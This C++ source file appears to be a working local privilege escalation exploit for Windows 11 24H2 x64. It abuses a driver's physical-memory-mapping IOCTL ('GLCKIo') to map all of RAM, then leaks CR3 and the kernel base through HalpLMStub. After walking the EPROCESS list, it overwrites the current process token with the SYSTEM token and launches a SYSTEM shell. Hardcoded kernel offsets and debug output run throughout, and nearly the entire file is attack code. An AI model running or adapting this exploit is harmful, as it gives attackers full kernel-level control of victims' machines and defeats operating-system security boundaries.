#include <Windows.h>
#include <iostream>

// Win 11 24h2 x64 offsets and definitions

#pragma comment( lib, "ntdll.lib" )

#define DEVICE_NAME "\\\\.\\GLCKIo"
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040

#define EPROCESS_TOKEN_OFFSET 0x248// win11 24h2 x64
#define PsInitialSystemProcessOffset 0xFC4AA8 // win11 24h2 x64
#define halpLMStubOffset 0x66DF70 // win11 24h2 x64
#define ProcessID_OFFSET 0x1d0  // win11 24h2 x64
#define Flink_OFFSET 0x1d8  // win11 24h2 x64



typedef struct _INPUTBUF
{
    ULONG64 Size;
    ULONG64 val2;
    ULONG64 val3;
    ULONG64 MappingAddress;
    ULONG64 val5;

} INPUTBUF;

UINT64 ReadMemoryU64(const UINT8* memory_data, UINT64 physical_address) {
    UINT64 value = 0;
    for (size_t i = 0; i < sizeof(UINT64); ++i) {
        value |= (UINT64)(memory_data[physical_address + i]) << (i * 8);
    }
    return value;
}
void HexDump(const uint8_t* data, size_t size, size_t base_addr) {
    for (size_t i = 0; i < size; i += 16) {
        printf("%08zX  ", base_addr + i);
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            printf("%02X ", data[i + j]);
        }
        printf(" ");
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = data[i + j];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("\n");
    }
}
UINT64 VirtualToPhysical(UINT64 cr3, UINT64 virtualAddr, BYTE* map) {

    UINT64 physicalAddr = 0;

    //std::cout << "\t[*] virtualAddr at " << std::hex << virtualAddr << std::endl;


    uint16_t PML4 = (uint16_t)((virtualAddr >> 39) & 0x1FF);
    uint16_t DirectoryPtr = (uint16_t)((virtualAddr >> 30) & 0x1FF);
    uint16_t Directory = (uint16_t)((virtualAddr >> 21) & 0x1FF);
    uint16_t Table = (uint16_t)((virtualAddr >> 12) & 0x1FF);

    //std::cout << "\t[*] PML4 at " << std::hex << PML4 << std::endl;
    //std::cout << "\t[*] DirectoryPtr at " << std::hex << DirectoryPtr << std::endl;
    //std::cout << "\t[*] Directory at " << std::hex << Directory << std::endl;
    //std::cout << "\t[*] Table at " << std::hex << Table << std::endl;


    uint64_t PML4E = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PML4E |= (uint64_t)(map[(cr3 + PML4 * sizeof(uint64_t)) + i]) << (i * 8);
    }

    //std::cout << "\t[*] PML4E at " << std::hex << PML4E << std::endl;

    uint64_t PDPTE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PDPTE |= (uint64_t)(map[((PML4E & 0xFFFF1FFFFFF000) + (uint64_t)DirectoryPtr * sizeof(uint64_t)) + i]) << (i * 8);
    }

    //std::cout << "\t[*] PDPTE at " << std::hex << PDPTE << std::endl;

    if ((PDPTE & (1 << 7)) != 0) {
        physicalAddr = (PDPTE & 0xFFFFFC0000000) + (virtualAddr & 0x3FFFFFFF);
        return physicalAddr;
    }

    uint64_t PDE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PDE |= (uint64_t)(map[((PDPTE & 0xFFFFFFFFFF000) + (uint64_t)Directory * sizeof(uint64_t)) + i]) << (i * 8);
    }

    //std::cout << "\t[*] PDE at " << std::hex << PDE << std::endl;

    if ((PDE & (1 << 7)) != 0) {
        physicalAddr = (PDE & 0xFFFFFFFE00000) + (virtualAddr & 0x1FFFFF);
        return physicalAddr;
    }

    uint64_t PTE = 0;

    for (size_t i = 0; i < sizeof(uint64_t); ++i) {
        PTE |= (uint64_t)(map[((PDE & 0xFFFFFFFFFF000) + (uint64_t)Table * sizeof(uint64_t)) + i]) << (i * 8);
    }

    std::cout << "\t[*] PTE at " << std::hex << PTE << std::endl;

    physicalAddr = (PTE & 0xFFFFFFFFFF000) + (virtualAddr & 0xFFF);

    return physicalAddr;
}

int main()
{
    HMODULE hModule = LoadLibrary(L"ntoskrnl.exe");

    //ULONG64 HalpLmStub = GetNtosBase() + 0x66df70; // 66 DF70

    std::cout << "Hello World!\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);

    if (GlobalMemoryStatusEx(&memoryStatus)) {
        printf("[*] Total physical memory: ~0x%llx bytes\n", memoryStatus.ullTotalPhys);
    }
    else {
        printf("[X] Failed to retrieve memory information. Error: %lu\n", GetLastError());
    }



    DWORD bytes_returned;
    HANDLE drv = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );


    INPUTBUF* inbuf = (INPUTBUF*)malloc(sizeof(INPUTBUF));
    inbuf->Size = (memoryStatus.ullTotalPhys - 1);
    inbuf->val2 = 0;
    inbuf->val3 = 0;
    inbuf->MappingAddress = 0;
    inbuf->val5 = 0;

    BOOL success = DeviceIoControl(
        drv,
        IOCTL_WINIO_MAPPHYSTOLIN,
        inbuf,
        sizeof(INPUTBUF),
        inbuf,
        sizeof(INPUTBUF),
        &bytes_returned,
        (LPOVERLAPPED)NULL
    );

    if (success) {

        wprintf(L"[*] Mapped %llx bytes at %p\n", inbuf->Size, inbuf->MappingAddress);

        BYTE* memory_data = (BYTE*)inbuf->MappingAddress;

        UINT64 halpLmStubPhysicalPointer = 0;
        DWORD_PTR physical_offset;
		unsigned long long halpoffset = 0;

        for (int i = 0x0; i < 0x1000000; i++) {
            UINT64 qword_value = (DWORD_PTR)hModule + i;

			if ((*((unsigned long long*)qword_value)) == 0xe1200f00ebd8220f) // first opcodes of the halpLMStub
            {

                halpLmStubPhysicalPointer = qword_value;
                halpoffset = i;
                printf("[*] HalpLMStub offset -> %p\n", halpoffset);

                break;
            }
        }

        //std::cout << "[*] NTOSKRNL.exe entry point at " << std::hex << ntosEntryPoint << std::endl;
        std::cout << "[*] NTOSKRNL.exe HALStub at " << std::hex << halpLmStubPhysicalPointer << " dword-> " << (halpLmStubPhysicalPointer & 0xFFFF) << std::endl;

        for (physical_offset = 0x0; physical_offset < 0x100000; physical_offset += sizeof(UINT64)) {

            UINT64 qword_value = ReadMemoryU64(memory_data, physical_offset);

            if ((qword_value & 0xFFFF) == (halpLmStubPhysicalPointer & 0xFFFF)) {

                printf("[*] Found HalpLMStub -> %p\n", qword_value);
                //HexDump(memory_data + physical_offset, 0x1000, physical_offset);
                halpLmStubPhysicalPointer = qword_value;
                printf("[*] phys offset -> %p\n", physical_offset);
                break; //hate it
            }

        }


        if (halpLmStubPhysicalPointer == 0) {
            std::cout << "[X] Cannot find nt!HalpLMStub in Low Stub" << std::endl;
        }

        ULONG32 cr3 = 0;

        for (size_t i = 0; i < sizeof(ULONG32); ++i) {
            cr3 |= (ULONG32)(memory_data[physical_offset + 0x30 + i]) << (i * 8);
        }

        std::cout << "[*] Leaked CR3 -> " << std::hex << cr3 << std::endl;


        unsigned long long kernel_base = halpLmStubPhysicalPointer - halpoffset;
        std::cout << "[*] Leaked Kernel Base -> " << std::hex << kernel_base << std::endl;
        unsigned long long psInitialSystemProcess = kernel_base + PsInitialSystemProcessOffset;
        std::cout << "[*] Leaked PsInitialSystemProcess -> " << std::hex << psInitialSystemProcess << std::endl;
        UINT64 systemEPROCESS = 0;

        systemEPROCESS = VirtualToPhysical(cr3, psInitialSystemProcess, memory_data);
        std::cout << "[*] Phys PsInitialSystemProcess -> " << std::hex << systemEPROCESS << std::endl;

        unsigned long long eprocess_system = ReadMemoryU64(memory_data, systemEPROCESS);
        std::cout << "[*] Eprocess System -> " << std::hex << eprocess_system << std::endl;
        unsigned long long p_pid = eprocess_system + ProcessID_OFFSET;
        unsigned long long p_pid_physical = VirtualToPhysical(cr3, p_pid, memory_data);
        unsigned long long pid_value = ReadMemoryU64(memory_data, p_pid_physical);
        std::cout << "[*] System PID -> " << pid_value << std::endl;
        unsigned long long curr_pid = GetCurrentProcessId();
        std::cout << "[*] Current PID -> " << curr_pid << std::endl;

        // Task Traversal 
        unsigned long long process_flink, process_flink_physical, next_process;

        next_process = eprocess_system;
        while (pid_value != curr_pid) {
            process_flink = next_process + Flink_OFFSET;
            std::cout << "[*] Process_FLink -> " << std::hex << process_flink << std::endl;
            process_flink_physical = VirtualToPhysical(cr3, process_flink, memory_data);
            next_process = (ReadMemoryU64(memory_data, process_flink_physical));
            pid_value = VirtualToPhysical(cr3, next_process - 0x8, memory_data);// pid is 8 bytes before flink
            pid_value = ReadMemoryU64(memory_data, pid_value);
            //std::cout << "[*] Next PID -> " << pid_value << std::endl;
            next_process = VirtualToPhysical(cr3, next_process, memory_data);;
            next_process = ReadMemoryU64(memory_data, next_process) - Flink_OFFSET;
        }
        unsigned long long process_blink = next_process + Flink_OFFSET + 0x8; // blink is 8 bytes after flink
        std::cout << "[*] Process_BLink -> " << std::hex << process_blink << std::endl;
        process_flink_physical = VirtualToPhysical(cr3, process_blink, memory_data);
        next_process = (ReadMemoryU64(memory_data, process_flink_physical)); // prev eprocess
        pid_value = VirtualToPhysical(cr3, next_process - 0x8, memory_data);// pid is 8 bytes before flink
        pid_value = ReadMemoryU64(memory_data, pid_value);
        std::cout << "[*] Current PID -> " << pid_value << std::endl; // yeah it is current process id

        // Task Traversal End




        unsigned long long sys_token = eprocess_system + EPROCESS_TOKEN_OFFSET;
        sys_token = VirtualToPhysical(cr3, sys_token, memory_data);
        sys_token = ReadMemoryU64(memory_data, sys_token) & 0xFFFFFFFFFFFFFFF0;

        std::cout << "[+] Sys_token: " << sys_token << std::endl;

		unsigned long long curr_token = (next_process - Flink_OFFSET) + EPROCESS_TOKEN_OFFSET; // don't forget to subtract flink offset to get eprocess
        curr_token = VirtualToPhysical(cr3, curr_token, memory_data);
        //curr_token = ReadMemoryU64(memory_data, curr_token);

        //std::cout << "[+] Current Token's Phys Address: " << curr_token << std::endl ;
        std::cout << "[+] Overwriting current process token" << std::endl << std::endl;

        for (int i = 0; i < sizeof(UINT64); ++i) {
            memory_data[curr_token + i] = (BYTE)((sys_token >> (i * 8)) & 0xFF);
        }


        std::cout << "[+] I'm gROOT... ";
        system("cmd");


    }
}